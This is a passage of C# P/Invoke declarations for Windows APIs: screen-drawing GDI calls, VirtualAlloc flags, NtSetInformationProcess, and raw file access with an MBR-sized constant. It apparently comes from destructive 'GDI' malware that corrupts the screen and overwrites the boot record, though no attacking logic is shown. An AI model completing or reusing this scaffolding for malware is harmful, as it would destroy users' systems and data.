        DSTINVERT = 0x00550009, /* dest = (NOT dest)*/
        BLACKNESS = 0x00000042, /* dest = BLACK*/
        WHITENESS = 0x00FF0062, /* dest = WHITE*/
    };
    [DllImport("user32.dll")]
    public static extern IntPtr GetDesktopWindow();

    [DllImport("user32.dll")]
    public static extern IntPtr GetWindowDC(IntPtr hWnd);

    [DllImport("Gdi32", EntryPoint = "GetBitmapBits")]
    public unsafe extern static long GetBitmapBits([In] IntPtr hbmp, [In] int cbBuffer, [Out] IntPtr lpvBits);
    [DllImport("gdi32.dll")]
    public static extern unsafe int SetBitmapBits(IntPtr hbmp, int cBytes, IntPtr lpvBits);

    [DllImport("gdi32.dll")]
    public unsafe static extern IntPtr CreateBitmap(int nWidth, int nHeight, uint cPlanes, uint cBitsPerPel, IntPtr lpvBits);

    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [Flags]
    public enum AllocationType
    {
        Commit = 0x1000,
        Reserve = 0x2000,
        Decommit = 0x4000,
        Release = 0x8000,
        Reset = 0x80000,
        Physical = 0x400000,
        TopDown = 0x100000,
        WriteWatch = 0x200000,
        LargePages = 0x20000000
    }

    [Flags]
    public enum MemoryProtection
    {
        Execute = 0x10,
        ExecuteRead = 0x20,
        ExecuteReadWrite = 0x40,
        ExecuteWriteCopy = 0x80,
        NoAccess = 0x01,
        ReadOnly = 0x02,
        ReadWrite = 0x04,
        WriteCopy = 0x08,
        GuardModifierflag = 0x100,
        NoCacheModifierflag = 0x200,
        WriteCombineModifierflag = 0x400
    }
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public unsafe struct RGBQUAD
    {
        public byte rgbBlue;
        public byte rgbGreen;
        public byte rgbRed;
        public byte rgbReserved;
    }

    [DllImport("gdi32.dll")]
    public static extern IntPtr CreateEllipticRgn(int nLeftRect, int nTopRect,
int nRightRect, int nBottomRect);

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

    [DllImport("kernel32")]
    private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode,
IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    [DllImport("kernel32")]
    private static extern bool WriteFile(IntPtr hfile, byte[] lpBuffer, uint nNumberOfBytesToWrite,
    out uint lpNumberBytesWritten, IntPtr lpOverlapped);

    private const uint GenericRead = 0x80000000;
    private const uint GenericWrite = 0x40000000;
    private const uint GenericExecute = 0x20000000;
    private const uint GenericAll = 0x10000000;

    private const uint FileShareRead = 0x1;
    private const uint FileShareWrite = 0x2;
    private const uint OpenExisting = 0x3;
    private const uint FileFlagDeleteOnClose = 0x40000000;
    private const uint MbrSize = 512u;


    [DllImport("user32.dll")]
    private static extern int GetFocus();

    [DllImport("user32.dll")]
    private static extern bool AttachThreadInput(uint idAttach, uint idAttachTo, bool fAttach);

    [DllImport("kernel32.dll")]
    private static extern uint GetCurrentThreadId();

    [DllImport("user32.dll")]
    private static extern uint GetWindowThreadProcessId(int hWnd, int ProcessId);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern int SendMessage(int hWnd, int Msg, int wParam, StringBuilder lParam);
}

